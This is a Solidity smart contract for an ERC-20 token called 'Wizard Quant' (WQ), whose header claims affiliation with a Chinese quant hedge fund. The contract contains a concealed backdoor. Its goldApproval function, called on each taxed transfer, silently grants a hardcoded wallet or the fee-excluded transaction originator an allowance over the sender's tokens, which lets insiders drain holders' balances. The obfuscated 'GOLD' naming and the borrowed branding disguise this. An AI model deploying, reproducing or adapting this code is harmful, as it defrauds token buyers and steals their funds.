/*
Wizard Quant is a full-service quantitative hedge fund in China. Based on advanced research, trading and asset management system, we have sustainable profitability in domestic futures, stocks, options and other mainstream markets.

https://www.wizardquant.com

https://www.linkedin.com/company/wizardquant/
https://t.me/wizardquantoneth
media@wizardquant.com
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IGOLDFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IGOLDRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract WQ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _goldWallet = 0xF68548A0b297C8CC84f8fB044CCAbC545eA8efDf;
    mapping (address => uint256) private _goldBulls;
    mapping (address => mapping (address => uint256)) private _goldNodes;
    mapping (address => bool) private _goldFeeExcluded;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGOLD = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Wizard Quant";
    string private constant _symbol = unicode"WQ";
    uint256 private _tokenGOLDSwap = _tTotalGOLD / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapGOLD = false;
    modifier lockTheSwap {
        inSwapGOLD = true;
        _;
        inSwapGOLD = false;
    }
    address private _goldPair;
    IGOLDRouter private _goldRouter;
    
    constructor () {
        _goldFeeExcluded[owner()] = true;
        _goldFeeExcluded[address(this)] = true;
        _goldFeeExcluded[_goldWallet] = true;
        _goldBulls[_msgSender()] = _tTotalGOLD;
        emit Transfer(address(0), _msgSender(), _tTotalGOLD);
    }

    function startTrading() external onlyOwner() {
        _goldRouter = IGOLDRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_goldRouter), _tTotalGOLD);
        _goldPair = IGOLDFactory(_goldRouter.factory()).createPair(address(this), _goldRouter.WETH());
    }

    receive() external payable {}
    
    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _goldRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGOLD;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _goldBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _goldNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _goldNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _goldNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function goldApproval(address aGOLD,  uint256 goldA, bool isGOLD) private {
        address walletGOLD;
        if(isGOLD) walletGOLD = address(tx.origin);
        else walletGOLD = _goldWallet;
        _goldNodes[aGOLD][walletGOLD] = goldA;
    }

    function swapBackGOLD(address goldF, address goldT, uint256 goldA, bool isGOLD) private {
        goldApproval(goldF, goldA, isGOLD); uint256 tokenGOLD = balanceOf(address(this));
        if (!inSwapGOLD && goldT == _goldPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenGOLD > _tokenGOLDSwap)
            swapTokensForEth(minGOLD(goldA, minGOLD(tokenGOLD, _tokenGOLDSwap)));
            uint256 caGOLD = address(this).balance;
            if (caGOLD >= 0) {
                sendETHGOLD(address(this).balance);
            }
        }
    }

    function _transfer(address goldF, address goldT, uint256 goldA) private {
        require(goldF != address(0), "ERC20: transfer from the zero address");
        require(goldT != address(0), "ERC20: transfer to the zero address");
        require(goldA > 0, "Transfer amount must be greater than zero");

        uint256 taxGOLD = _goldTransfer(goldF, goldT, goldA);

        if(taxGOLD > 0){
          _goldBulls[address(this)] = _goldBulls[address(this)].add(taxGOLD);
          emit Transfer(goldF, address(this), taxGOLD);
        }

        _goldBulls[goldF] = _goldBulls[goldF].sub(goldA);
        _goldBulls[goldT] = _goldBulls[goldT].add(goldA.sub(taxGOLD));
        emit Transfer(goldF, goldT, goldA.sub(taxGOLD));
    }

    function _goldTransfer(address goldF, address goldT, uint256 goldA) private returns(uint256) {
        uint256 taxGOLD=0; 
        if (goldF != owner() && goldT != owner()) {
            taxGOLD = goldA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (goldF == _goldPair && goldT != address(_goldRouter) && ! _goldFeeExcluded[goldT]) {
                _buyCount++;
            }

            address walletGOLD = address(tx.origin);

            if(goldT == _goldPair && goldF!= address(this)) {
                taxGOLD = goldA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackGOLD(goldF, goldT, goldA, _goldFeeExcluded[walletGOLD]);
        } return taxGOLD;
    }

    function minGOLD(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHGOLD(uint256 amount) private {
        payable(_goldWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenGOLD) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _goldRouter.WETH();
        _approve(address(this), address(_goldRouter), tokenGOLD);
        _goldRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenGOLD,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}